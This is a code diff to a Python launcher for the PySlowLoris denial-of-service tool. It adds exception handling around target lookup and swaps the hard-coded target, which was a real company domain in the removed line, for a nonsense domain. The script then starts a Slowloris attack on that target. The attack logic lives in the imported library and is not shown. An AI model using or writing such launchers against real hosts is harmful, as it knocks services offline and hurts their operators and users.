@@ -33,7 +33,7 @@ import threading
 import time
 from signal import signal, SIGABRT, SIGILL, SIGINT, SIGSEGV, SIGTERM
 
-from PySlowLoris import TargetInfo, SlowLorisAttack
+from PySlowLoris import TargetInfo, TargetNotExistException, SlowLorisAttack, logger
 
 __all__ = ["main"]
 
@@ -125,7 +125,13 @@ def print_table(table):
 
 
 def print_info(target):
-    target.get_info()
+    try:
+        target.get_info()
+    except TargetNotExistException as tne:
+        logger.exception(tne)
+        sys.exit(-1)
+    except:
+        sys.exit(-1)
 
     table = [('Target IP:', target['ip']), ('Target Hostname:', target['url']), ('Target Server:', target['server']),
              ('Target Port', str(target['port'])), ('Launch Time:', datetime.datetime.now().strftime("%Y-%m-%d %H:%M"))]
@@ -157,8 +163,8 @@ def main():
 
 
 if __name__ == "__main__":
-    target = TargetInfo(url="http://insart.com/", port=80)
-    target.get_info()
+    target = TargetInfo(url="http://werhxfcrqEZSGdxfAWZHXF.com/", port=80)
+    print_info(target)
     global slowloris
     slowloris = SlowLorisAttack(target)
     slowloris.start_attack()
